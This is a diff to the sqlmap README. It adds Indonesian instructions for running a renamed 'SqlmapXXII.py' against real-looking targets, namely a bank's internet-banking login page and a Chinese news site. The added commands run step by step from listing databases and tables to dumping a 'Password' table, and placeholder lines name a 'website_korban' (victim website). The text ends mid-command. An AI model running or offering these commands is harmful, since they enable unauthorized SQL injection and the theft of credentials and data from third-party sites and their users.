@@ -71,3 +71,25 @@ Translations
 * [Turkish](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-tr-TR.md)
 * [Ukrainian](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-uk-UA.md)
 * [Vietnamese](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-vi-VN.md)
+
+
+Cara Jalankan SqlmapXII dgn perintah berikut ini :
+
+python2 SqlmapXXII.py -u https://ibank.bri.co.id/cms/Logon.aspx --dbs
+
+python2 SqlmapXXII.py -u https://chinamost.com/en/news_detail.php\?id\=30 --dbs
+
+python2 SqlmapXXII.py -u https://chinamost.com/en/news_detail.php\?id\=30 --tables -D cn_db
+
+python2 SqlmapXXII.py -u https://chinamost.com/en/news_detail.php\?id\=30 -D cn_db -T Password --columns
+
+python2 SqlmapXXII.py -u https://chinamost.com/en/news_detail.php\?id\=30 -D cn_db -T Password --dump
+• python2 SqlmapXXII.py -u http://webtarget.com --dbs
+• python2 SqlmapXXII.py -u http://webtarget.com -D NamaDataBase --tables
+• python2 SqlmapXXII.py -u http://webtarget.com -D NamaDataBase -T NamaTables --columns
+• python2 SqlmapXXII.py -u http://webtarget.com -D NamaDataBase -T NamaTables -C NamaColumns, USer --dump
+Setelah itu.
+Ketik perintah:
+python2 SqlmapXXII.py -u http://website_korban.com/index.php?id=1 ---dbs
+Contoh:
+python2 SqlmapXXII.py -u 
